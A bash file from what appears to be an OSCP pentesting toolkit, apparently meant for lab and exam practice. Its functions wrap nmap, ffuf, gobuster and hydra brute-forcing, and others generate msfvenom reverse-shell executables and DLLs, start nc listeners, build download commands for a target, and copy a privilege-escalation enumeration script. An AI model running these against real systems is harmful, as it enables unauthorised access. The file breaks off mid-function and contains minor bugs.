#!/bin/bash


source $HOME/oscp-swiss/script/utils.sh
source $HOME/oscp-swiss/script/alias.sh
source $HOME/oscp-swiss/script/extension.sh

load_settings
load_private_scripts

# Description: List all functions, aliases, and variables
# Usage: swiss
function swiss() {

    _banner() {
        logger info ".--------------------------------------------."
        logger info "|                                            |"
        logger info "|                                            |"
        logger info "|  __________       _______________________  |"
        logger info "|  __  ___/_ |     / /___  _/_  ___/_  ___/  |"
        logger info "|  _____ \\__ | /| / / __  / _____ \\_____ \\   |"
        logger info "|  ____/ /__ |/ |/ / __/ /  ____/ /____/ /   |"
        logger info "|  /____/ ____/|__/  /___/  /____/ /____/    |"
        logger info "|                                            |"
        logger info "|  by @dextermallo v$_swiss_app_version                    |"
        logger info "'--------------------------------------------'"
    }

    if [ $_swiss_app_banner = true ]; then
        _banner
    fi

    local swiss_path="$HOME/oscp-swiss/script/oscp-swiss.sh"
    local alias_path="$HOME/oscp-swiss/script/alias.sh"
    local extension_path="$HOME/oscp-swiss/script/extension.sh"

    logger info "[i] Functions:"
    {
        grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$swiss_path" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/';
        grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$extension_path" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/';
    } | sort | column

    logger info "\n[i] Aliases:"
    grep -E '^\s*alias\s+' "$extension_path" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column

    logger info "\n[i] Variables:"
    {
        grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$extension_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
        grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$alias_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
    } | sort | column

    # load /private scripts
    local script_dir="$HOME/oscp-swiss/private"
    if [ -d "$script_dir" ]; then
        for script in "$script_dir"/*.sh; do
        if [ -f "$script" ]; then

            if grep -qE '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"; then
                logger info "\n[i] Function under $script:"
                grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"| sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column
            fi
            
            if grep -qE '^\s*alias\s+' "$script"; then
                logger info "[i] Aliases under $script:"
                grep -E '^\s*alias\s+' "$script" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
            fi
            
            if grep -qE '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$script"; then
                logger info "[i] Variables under $script:"
                grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$script" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
            fi
        fi
        done
    else
        echo "Directory $script_dir not found."
    fi
}

# Description: Wrapped nmap command with default options
# Usage: nmap_default <IP> [mode]
# Modes: fast (default), tcp, udp, udp-all, stealth
# Example: nmap_default 192.168.1.1
function nmap_default() {
    local ip=""
    local mode=${2:-"fast"}
    
    _help() {
        logger info "Usage: nmap_default <IP> [<mode>]"
        logger info "Modes: fast (default), tcp, udp, udp-all, stealth"
    }

    if [[ "$1" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        ip="$1"
        shift
    else
        _help
        return 1
    fi

    local saved_file_path="$(pwd)/nmap/$ip"
    logger info "[i] Creating directory $saved_file_path ..."
    mkdir -p $saved_file_path

    case "$mode" in
        fast)
            mkdir -p $saved_file_path/fast
            logger info "[i] Start quick check. Saved to $saved_file_path/fast/tcp"
            nmap -v --top-ports 2000 $ip -oN $saved_file_path/fast/tcp

            local fast_ports=$(grep -oP '^\d+\/\w+' $saved_file_path/fast/tcp | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            logger info "[i] Checking service on ports - $fast_ports. Saved to $saved_file_path/fast/tcp-svc"
            nmap -p$fast_ports -sVC $ip -oN $saved_file_path/fast/tcp-svc

            logger info "[i] Checking vuln script - $fast_ports. Saved to $saved_file_path/fast/tcp-vuln"
            nmap -p$fast_ports --script vuln $ip -oN $saved_file_path/fast/tcp-vuln

            logger info "[i] Check UDP top 200 ports. Saved to $saved_file_path/fast/udp-top-200"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/fast/udp-top-200

            logger warn "[i] Remember to run tcp and udp mode for full enumeration"
            ;;
        tcp)
            mkdir -p $saved_file_path/tcp
            logger info "[i] Start tcp check. Saved to $saved_file_path/tcp/check-1"
            nmap -p0-65535 -v $ip -oN $saved_file_path/tcp/check-1

            local ports=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-1 | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            logger info "[i] Checking service on ports - $ports. Saved to $saved_file_path/tcp/svc"
            nmap -p$ports -sVC $ip -oN $saved_file_path/tcp/svc

            logger info "[i] Checking vuln script - $ports. Saved to $saved_file_path/tcp/vuln"
            nmap -p$ports --script vuln $ip -oN $saved_file_path/tcp/vuln

            logger warn "[i] Services found in the second round but not in the first round:"
            comm -13 <(echo "$services_first") <(echo "$services_second")
            ;;
        udp)
            mkdir -p $saved_file_path/udp
            logger info "[i] Start udp check (top 200 ports). Saved to $saved_file_path/udp/udp_fast"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/udp/fast
            ;;
        udp-all)
            mkdir -p $saved_file_path/udp
            logger info "[i] Start udp check (all). Saved to $saved_file_path/udp/udp_all"
            sudo nmap -sU -F -v $ip -oN $saved_file_path/udp/udp_all
            ;;
        stealth)
            mkdir -p $saved_file_path/stealth
            logger info "[i] Start stealth nmap. Saved to $saved_file_path/stealth/stealth"
            sudo nmap -sS -p0-65535 -oN $saved_file_path/stealth/stealth
            ;;
        *)
            echo "Error: Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
            return 1
            ;;
    esac
}

# Description: one-liner to start services, including docker, ftp, http, smb, ssh, bloodhound, ligolo (extension), wsgi
# Usage: svc <service name>
# Arguments:
#   service name: docker; ftp; http; smb; ssh; bloodhound; ligolo (extension); wsgi
# Example:
#   svc http # to spawn a http server in the current directory
#   svc ftp  # to spawn a ftp server in the current directory
function svc() {
    local service=""

    _help() {
        logger info "Usage: svc <service name>]"
        logger info "service: docker; ftp; http; smb; ssh; bloodhound; ligolo; wsgi"
    }

    service="$1"

    if [[ -z "$service" ]]; then
        _help
        return 1
    fi

    case "$service" in
        docker)
            logger info "[i] start docker"
            logger warn "[i] to stop, use the following commands: "
            logger warn "[i] sudo systemctl stop docker"
            logger warn "[i] sudo systemctl stop docker.socket"
            sudo service docker restart
            ;;
        ftp)
            logger info "[i] start ftp server on host"
            logger info "[i] usage:"
            logger info "[i] (1) run ftp"
            logger info "[i] (2) run open <ip> 21"
            logger info "[i] (2-2) Default Interface ($_swiss_default_network_interface) IP: $(get_default_network_interface_ip)"
            logger info "[i] (3) use username anonymous"
            logger info "[i] (4) binary # use binary mode"
            logger info "[i] (5) put <file-you-want-to-download>"
            python3 -m pyftpdlib -w -p 21
            ;;
        http)
            logger info "[i] start http server"
            logger warn "[i] python3 -m http.server 80"
            i
            python3 -m http.server 80
            ;;
        smb)
            logger info "[i] start smb server"
            logger info "[i] impacket-smbserver smb . -smb2support"
            i
            impacket-smbserver smb . -smb2support
            ;;
        ssh)
            logger info "[i] start ssh server"
            logger warn "[i] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            # kill all ssh process
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            sudo systemctl start ssh
            ;;
        bloodhound)
            # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
            logger info "[i] start BloodHound CE (v2.4.1) ..."
            logger info "[i] start port check on 8080"

            # Check if port 8080 is open using lsof
            if lsof -i :8080 > /dev/null; then
                logger error "Port 8080 is open. Exited"
                exit 1
            fi

            logger info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            logger info "[i] preferred password: @Bloodhound123"

            sudo docker-compose up
            ;;
        ligolo)
            extension_fn_banner
            logger info "[i] start ligolo agent"
            logger warn "[i] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
            logger info "[i] under target (find agent executable under \$ligolo_path):"
            logger info "[i] agent.exe -connect $(get_default_network_interface_ip):443 -ignore-cert"
            logger warn "[i] Using fingerprint: "
            logger warn "[i] agent.exe -connect $(get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"

            logger info "[i] after connection: "
            logger info "[i] > session                                    # choose the session"
            logger info "[i] > ifconfig                                   # check interface"
            logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
            logger warn "[i] ip route del 122.252.228.38/32               # removal after use"
            logger info "[i] start                                        # start the agent"

            local ligolo_agent_path="$HOME/oscp-swiss/utils/tunnel/ligolo-0.6.2/proxy"
            $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
            ;;
        wsgi)
            logger info "[i] start wsgidav under the directory: $(pwd)"
            logger info "[i] usage: svc_wsgi <port>"
            i
            $HOME/.local/bin/wsgidav --host=0.0.0.0 --port=${@} --auth=anonymous --root .
            ;;
        *)
            logger error "Error: Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
            return 1
            ;;
    esac
}

# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>
# Arguments:
#   -t|--type: linux|windows (default: linux)
#   -a|--auto-host-http: auto-host the http server (default: true)
# Example:
#   ship ./rce.sh
#   ship -t windows ./rce.exe
function ship() {
    local type="linux"
    local filepath
    local autoHostHttp=true

    _helper() {
        logger error "[e] Filepath is required."
        logger info "[i] Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>"
        return 1
    }

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type)
                type="$2"
                shift 2
                ;;
            -a|--auto-host-http)
                autoHostHttp="$2"
                shift 2
                ;;
            *)
                filepath="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$filepath" ]]; then
        _helper
    fi

    if [[ ! -f "$filepath" ]]; then
        logger error "[e] File '$filepath' does not exist."
        return 1
    fi

    local filename=$(basename "$filepath")

    cp "$filepath" "./$filename" && logger info "[i] File '$filename' copied to current directory."


    autoHost() {
        if [[ "$autoHostHttp" = true ]]; then
            svc http
        else
            echo warning "[W] Remember to host the web server on your own"
        fi
    }

    if [[ "$type" == "linux" ]]; then
        local cmd="wget $(get_default_network_interface_ip)/$filename"
        logger info "[i] Linux type selected. wget command ready."
        logger info "[i] $cmd"
        echo -n $cmd | xclip -selection clipboard

        autoHost

    elif [[ "$type" == "windows" ]]; then
        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
        logger info "[i] Windows type selected. wget command ready."
        logger info "[i] $cmd"

        echo -n $cmd | xclip -selection clipboard

        autoHost
    else
        log error "Unknown type '$type'. Set to 'linux'."
    fi
}

# Description:
#   One-liner to start a reverse shell listener,
#   warpped with rlwrap to make the reverse shell interactive
# Usage: listen <port>
function listen() {
    rlwrap nc -lvnp $1
}

# Description: Generate a reverse shell using msfvenom
# Usage: windows_rev <-p PORT> <-a x86|x64|dll> [-i IP]
# Arguments:
#   -p|--port: Port number for the reverse shell
#   -a|--arch: Architecture for the reverse shell (x86, x64, dll)
#   -i|--ip: IP address for the reverse shell
# Example:
#  windows_rev -p 4444 -a x86 -i
function windows_rev() {
    logger info "[i] generating windows rev exe using msfvenom"

    local ip=$(get_default_network_interface_ip)
    local port=""
    local arch=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--arch)
                arch="$2"
                shift 2
                ;;
            *)
                logger error "[i] Invalid option: $1"
                logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
                return 1
                ;;
        esac
    done

    if [[ -z "$port" || -z "$arch" ]]; then
        logger error "[i] Port and architecture must be specified"
        logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
        return 1
    fi

    case $arch in
        x86)
            msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86.exe
            ;;
        x64)
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64.exe
            ;;
        dll)
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o tzres.dll
            ;;
        *)
            logger error "[i] Invalid architecture: $arch. Only x86, x64, and dll are supported."
            return 1
            ;;
    esac
}

# Description: directory fuzzing using fuff, compatible with original arguments
# Usage: ffuf_default [URL/FUZZ] (options)
# Example: ffuf_default http://example.com/FUZZ -fc 400
function ffuf_default() {

    _helper() {
        logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
        logger warn "[i] Recursive with depth = $_swiss_ffuf_default_recursive_depth"
        logger warn "[i] Default wordlist: $_swiss_ffuf_default_wordlist"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            # If the URL includes a protocol, extract the part after '://'
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            # If the URL does not include a protocol, treat the first part as the domain/IP
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_ffuf_default_wordlist.statistic" ]]; then
            logger warn "[w] ====== Wordlist Statistic ======"
            _cat $_swiss_ffuf_default_wordlist.statistic
            logger warn "[w] ================================"
        fi

        local stripped_url="${url/FUZZ/}"

        if [ $_swiss_ffuf_default_use_dirsearch = true ]; then
            if check_cmd_exist dirsearch; then
                logger info "[i] (Extension) dirsearch quick scan"
                dirsearch -u $stripped_url
            else
                logger error "[e] dirsearch is not installed"
            fi
        fi

        ffuf -w $_swiss_ffuf_default_wordlist -recursion -recursion-depth $_swiss_ffuf_default_recursive_depth -u ${@} | tee "$domain_dir/ffuf-default"
    fi
}

# Description: file traversal fuzzing using ffuf, compatible with original arguments
# Usage: ffuf_traversal [URL] (options)
# Example: ffuf_traversal http://example.com -fc 400
function ffuf_traversal_default() {
    _helper() {
        logger info "[i] Usage: ffuf_traversal_default [URL] (options)"
        logger warn "[i] You may need to try <URL>/FUZZ and <URL>FUZZ"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_ffuf_traversal_default_wordlist.statistic" ]]; then
            logger warn "[w] ====== Wordlist Statistic ======"
            _cat $_swiss_ffuf_traversal_default_wordlist.statistic
            logger warn "[w] ================================"
        fi

        ffuf -w $_swiss_ffuf_traversal_default_wordlist -u ${@} | tee "$domain_dir/traversal-default"
    fi
}

# Description: subdomain fuzzing using gobuster, compatible with original arguments
# Usage: gobuster_subdomain_default [domain_name] (options)
# Example: gobuster_subdomain_default example.com
function gobuster_subdomain_default() {
    _helper() {
        logger info "[i] Usage: gobuster_subdomain_default [domain_name] (options)"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_gobuster_subdomain_default_wordlist.statistic" ]]; then
            logger warn "[w] ====== Wordlist Statistic ======"
            _cat $_swiss_gobuster_subdomain_default_wordlist.statistic
            logger warn "[w] ================================"
        fi

        gobuster dns -w $_swiss_gobuster_subdomain_default_wordlist -t 20 -o $domain_dir/subdomain-default -d ${@}
    fi
}

# Description: vhost fuzzing using gobuster, compatible with original arguments
# Usage: gobuster_vhost_default [ip] [domain] (options)
# Arguments:
#   - ip: IP address
#   - domain: Domain name (e.g., example.com)
# Example: gobuster_vhost_default
function gobuster_vhost_default() {
    _helper() {
        logger info "[i] Usage: gobuster_vhost_default [ip] [domain] (options)"
    }

    if [ $# -eq 0 ]; then
        _helper
    else

        local ip="$1"
        local domain="$2"
        local domain_dir="$(pwd)/ffuf/$domain"
        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_gobuster_vhost_default_wordlist.statistic" ]]; then
            logger warn "[w] ====== Wordlist Statistic ======"
            _cat $_swiss_gobuster_vhost_default_wordlist.statistic
            logger warn "[w] ================================"
        fi

        gobuster vhost -k -u $ip --domain $domain --append-domain -r \
                 -w $_swiss_gobuster_vhost_default_wordlist \
                 -o $domain_dir/vhost-default -t 64
    fi
}

# Description: hydra default
# Usage: hydra_default <IP> <PORTS>
# Example: hydra_default
function hydra_default() {
    local IP=$1
    local PORTS=$2

    if [ ! -f "username.txt" ]; then
        logger error "[E] username.txt not found in the current directory."
        return 1
    fi

    for PORT in $(echo $PORTS | tr "," "\n"); do
        case $PORT in
            21)
                logger info "[I] Running hydra for FTP on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ftp://$IP
                ;;
            22)
                logger info "[I] Running hydra for SSH on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ssh://$IP
                ;;
            23)
                logger info "[I] Running hydra for Telnet on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT telnet://$IP
                ;;
            *)
                echo "Port $PORT not recognized or not supported for brute-forcing by this script."
                ;;
        esac
    done
}

# Description: get all urls from a web page
# Usage: get_web_pagelink <url>
function get_web_pagelink() {
    logger info "[i] start extracting all urls from $1"
    logger info "[i] original files will be stored at $PWD/links.txt"
    logger info "[i] unique links (remove duplicated) will be stored at $PWD/links-uniq.txt"
    lynx -dump $1 | awk '/http/{print $2}' > links.txt
    sort -u links.txt > links-uniq.txt
    cat ./links-uniq.txt
}

# Description: get keywords from a web page
# Usage: get_web_keywords <url>
function get_web_keywords() {
    logger info "[i] Usage: get_web_keywords <url>"
    cewl -d $_swiss_get_web_keywords_depth -m $_swiss_get_web_keywords_min_word_length -w cewl-wordlist.txt $1
}

# Description: set the target IP address and set variable target
# Usage: set_target <ip>
function set_target() {
    s target $1
    target=$1
}

# Description: get the target IP address and copy it to the clipboard.
# Usage: get_target
function get_target() {
    target=$(g target)
    if [[ "$target" == "-1" ]]; then
        logger error "Target not found."
    elif [[ "$target" == "-2" ]]; then
        logger error "[!] Config file not found!"
    else
        echo -n "$target" | xclip -selection clipboard
        echo "Target '$target' copied to clipboard."
    fi
}

# Description:
#   Copy a linpeas-like script to the clickboard. You can paste it to the target machine (Linux) directly without any file transfer effort.
#   This is helpful to help you to enumerate the target machine.
#   Once you paste the script to the target machine, you can run the command `check` to enumerate:
# Usage (On the target machine): 
#   Usage: check <option>
# Arguments (option):
#   - 1|user|u: check user information
#   - 2|su: check sudo permission
#   - 3|suid: check suid permission
#   - 4|cred-file: check common credential files (i.e., /etc/passwd, /etc/group)
#   - 5|exec|executable: listing executable files
#   - 6|dir|directory: listing interesting directories (e.g., /tmp, /opt)
#   - 7|os: check OS information
#   - 8|ps|proc|process: check running processes
#   - 9|cron|crontab: check cron jobs
#   - 10|net|network: check network information
#   - 11|dir-filename: find interesting filename recursively under the current directory
#   - 12|dir-file: find the interesting file content recursively under the current directory
#   - 13|search-filename <keyword>: search filename with keyword under the current directory
#   - 14|search-file <keyword>: search file content with keyword under the current directory
#   - 15|env: check environment variables
# Example:
#   $ check user             # list user information
#   $ check 3                # list suid permission
#   $ check 14 funny-content # search file content with 'funny-content' under the current directory
function cp_target_script() {
    logger info "[i] Usage: cp_target_script"
    local shell_path="$HOME/oscp-swiss/script/target-enum-script.sh"
    local new_file_path="$mktemp.sh"
    _cat $shell_path > $new_file_path
    echo "" >> $new_file_path
    echo "host='$(get_default_network_interface_ip)'" >> $new_file_path
    echo "clear" >> $new_file_path
    _cat $new_file_path | xclip -selection clipboard
    rm $new_file_path
}

# Description: tcpdump traffic from an IP address
# Usage: listen_target <ip> [-i <interface> | --interface <interface>]
# Arguments:
#  <ip>: IP address to listen to
#  -i, --interface: Network interface to listen on (default: tun0)
# Example:
#   listen_target 192.168.1.2 # listen on traffic from/to 192.168.1.2 on the default network interface
function listen_target() {
    logger info "[i] tcpdump to listen on traffic from/to an IP address"
    logger info "[i] Usage: listen_target <ip> [-i <interface> | --interface <interface>]"

    local interface="${DEFAULT_NETWORK_INTERFACE:-tun0}"
    local ip=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--interface)
                interface="$2"
                shift 2
                ;;
            *)
                ip="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$ip" ]]; then
        logger error "[!] IP address is required"
        return 1
    fi

    sudo tcpdump -i "$interface" dst "$ip" or src "$ip"
}

# Description:
#   Generate workspace for pen test. Including:
#       - Create a directory with the format <name>-<ip>
#       - Create username.txt and password.txt
#       - Set the current path as workspace, you can use go_workspace to jump to the workspace across sessions
#       - Set the target IP address, you can use get_target to copy the target IP address to the clipboard
#       - Copy the ip to the clipboard
# Usage: init_workspace
function init_workspace() {
    logger info "[i] Initializing workspace ..."
    logger info "[i] Enter workspace name: \c"
    read -r workspace_name
    logger info "[i] Enter IP address: \c"
    read -r ip_address

    local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
    if [[ ! $ip_address =~ $ip_regex ]]; then
        logger error "[!] Invalid IP address format."
        return 1
    fi

    local dir_name="${workspace_name}-${ip_address}"

    mkdir -p "$dir_name"
    cd "$dir_name" || { logger error "[!] Failed to enter directory '$dir_name'"; return 1; }

    touch username.txt
    touch password.txt

    set_workspace
    set_target "$ip_address"
    get_target
}

# Description: set the current path as workspace (cross-session)
# Usage: set_workspace
function set_workspace() {
    s workspace $PWD
}

# Description: go to the path defined as workspace (cross-session)
# Usage: go_workspace
function go_workspace() {
    cd $(g workspace)
}

# Description:
#   Spawn the new session in the workspace, and set target into the variables.
#   The  function is configured by the environment variable _swiss_spawn_session_in_workspace_start_at_new_session
#   See settings.json for more details.
# Usage: spawn_session_in_workspace
function spawn_session_in_workspace() {
    if [ "$_swiss_spawn_session_in_workspace_start_at_new_session" = true ]; then
        go_workspace
        target=$(g target)
    fi
}

# Description: merge files into one file. Especially used for merging wordlists.
# Usage: merge <file1> <file2> ... [-o <output>] [-s <statistic>]
# Arguments:
#  -o|--output: Output file name (default: merged.txt)
#  -s|--statistic: greate a statistic of your merges (default: true)
# Example:
#   # To combine wordlists for subdomain enumeration:
#   merge /usr/share/wordlists/amass/subdomains-top1mil-110000.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
#         -o subdomain+vhost-default.txt
function merge() {
    local output="merged.txt"
    local statistic=true
    local files=()
    local total_lines=0

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -o|--output)
                output="$2"
                shift 2
                ;;
            -s|--statistic)
                statistic="$2"
                shift 2
                ;;
            *)
                files+=("$1")
                shift
                ;;
        esac
    done

    if [[ "${#files[@]}" -lt 2 ]]; then
        logger error "At least two files to merge."
        return 1
    fi

    for file in "${files[@]}"; do
        if [[ ! -f "$file" ]]; then
            logger error "File not found: $file"
            return 1
        fi
    done

    local temp_output=$(mktemp)

    for file in "${files[@]}"; do
        total_lines=$((total_lines + $(wc -l < "$file")))
        sort -u "$file" >> "$temp_output"
    done

    sort -u "$temp_output" -o "$output"
    rm "$temp_output"

    local unique_lines
    unique_lines=$(wc -l < "$output")
    local duplicates_removed=$((total_lines - unique_lines))

    if [[ "$statistic" == true ]]; then
        local stat_file="$output.statistic"
        {
            echo "Original filenames:"
            for file in "${files[@]}"; do
                echo "  - $file"
            done
            echo "Line counts per file:"
            for file in "${files[@]}"; do
                echo "  - $file: $(wc -l < "$file") lines"
            done
            echo "Total line count before merge: $total_lines"
            echo "Total line count after merge: $unique_lines"
            echo "Lines saved after merge (duplicates removed): $duplicates_removed"
        } > "$stat_file"
    fi

    logger info "[i] Files merged into $output"
    [[ "$statistic" == true ]] && logger info "[i] Statistics saved to $stat_file"
}

# Description: retrieve all files from a ftp server
# Usage: get_ftp_all_files <ipaddress> [username] [password]
# Arguments:
#   - ipaddress: IP address of the FTP server
#   - username: FTP username (default: anonymous)
#   - password: FTP password (default: anonymous)
# Example: get_ftp_all_files 192.168.1.1
function get_ftp_all_files() {
    local IP=$1
    local USERNAME=${2:-"anonymous"}
    local PASSWORD=${3:-"anonymous"}

    _helper() {
        echo "Usage: get_ftp_all_files <ipaddress> [username] [password]"
        return 1
    }

    if [ -z "$IP" ]; then
        _helper
        return 1
    fi

    wget -r --no-passive --no-parent ftp://$USERNAME:$PASSWORD@$IP
}

# Description: lookup an IP address's public information
# Usage: target_ipinfo <ip>
function target_ipinfo() {
  curl https://ipinfo.io/$1/json
}

# Description: lookup the public IP address of the host
# Usage: host_public_ip
function host_public_ip() {
  curl ipinfo.io/ip
}

# Description:
#   Show all utils in the utils directory with customized description.
#   When a file has a corresponding markdown file with the same name under the same 
#   directory, the description will be shown. (Only the first line of the markdown file)
# Usage: list_utils [directory] (default: $HOME/oscp-swiss/utils)
# Example:
# you have a frequent-used reverse-shell under $HOME/oscp-swiss/utils/reverse-shell.php
# and you have a description file $HOME/oscp-swiss/utils/reverse-shell.php.md
# with content:
# ```md
# (make sure to change the IP and port before using it.)
# ```
# When you run list_utils, the description will be shown like:
#   /home/dex/oscp-swiss/utils
#   ├── reverse-shell.php (make sure to change the IP and port before using it.)
#   ├── ...
#   └── other-utils
function list_utils() {
    local default_dir="$HOME/oscp-swiss/utils"
    local dir="$1"

    if [[ -z "$dir" ]]; then
        dir="$default_dir"
    elif [[ "$dir" == /* ]]; then
        dir="$dir"
    else
        dir="$default_dir/$dir"
    fi

    if [[ ! -d "$dir" ]]; then
        logger error "[e] path does not exist"
        return 1
    fi

    tree -C "$dir" -L 1 | while read -r line; do
        # Extract the file name from the tree output by ignoring color codes
        filename=$(echo "$line" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | awk '{print $NF}')
        
        desc_file="${dir}/${filename}.md"
        
        if [[ -f "$desc_file" ]]; then
            desc=$(head -n 1 "$desc_file")
            echo -e "$line \033[33m$desc\033[0m"
        else
            if [[ "$filename" != *.md ]]; then
                echo "$line"
            fi
        fi
    done
}

# Description:
#   Combo of list_utils. This will show a file's description if it has a corresponding markdown file.
# Usage: explain <file_or_directory>
function explain() {
    local file="$1"

    if [[ "file" != /* ]]; then
        file="$HOME/oscp-swiss/utils/$file"
    fi

    if [[ -z "$file" ]]; then
        logger info "Usage: explain <file_or_directory>"
        return 1
    fi
    
    local desc_file="${file}.md"
    
    if [[ -f "$desc_file" ]]; then
        cat "$desc_file"
    else
        logger warn "No description file found for $file."
    fi
}

# TODO: Doc
function make_variable() {
    local file_path="$1"
    local name="$2"

    if [ ! -f "$file_path" ]; then
        logger warn "The file path $file_path does not exist."
        return 1
    fi

    if [[ "$file_path" != /* ]]; then
        file_path="$(realpath "$file_path")"
    fi

    file_path="${file_path/#$HOME/\$HOME}"

    local alias_file="$HOME/oscp-swiss/script/alias.sh"
    touch "$alias_file"

    if [ -n "$(tail -c 1 "$alias_file")" ]; then
        echo >> "$alias_file"
    fi

    echo "$name='$file_path'" >> "$alias_file"
    logger info "[i] Variable $name for $file_path has been added."
}

# TODO: Doc
function cheatsheet() {

    _helper() {
        logger info "[i] Usage cheatsheet <cheatsheet name>"
        logger info "[i] Current cheatsheet: <tty>"
    }

    local cheatsheet=""
    case "$1" in
            tty)
                output="$2"
                cat <<'EOF'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;

# stty -a to get rows and cols
stty raw -echo; fg;

clear;export SHELL=/bin/bash;export TERM=xterm-256color;stty rows 60 columns 160;reset

# color-ref: https://ivanitlearning.wordpress.com/2020/03/25/adding-colour-to-linux-tty-shells/
# only works in bash. if facing Garbled, try go into bash 
export LS_OPTIONS='--color=auto'; eval "`dircolors`"; alias ls='ls $LS_OPTIONS'; export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '

# If facing garbled, use:
PS1="# "
EOF
                ;;
            *)
                _helper
                return 1
                ;;
        esac    
}

# Usage: rev_shell
# TODO: Doc
# TODO: built-in encode
# TODO: env default port
function rev_shell() {
    logger info "[i] Enter IP (Default: $(get_default_network_interface_ip)): \c"
    read -r IP
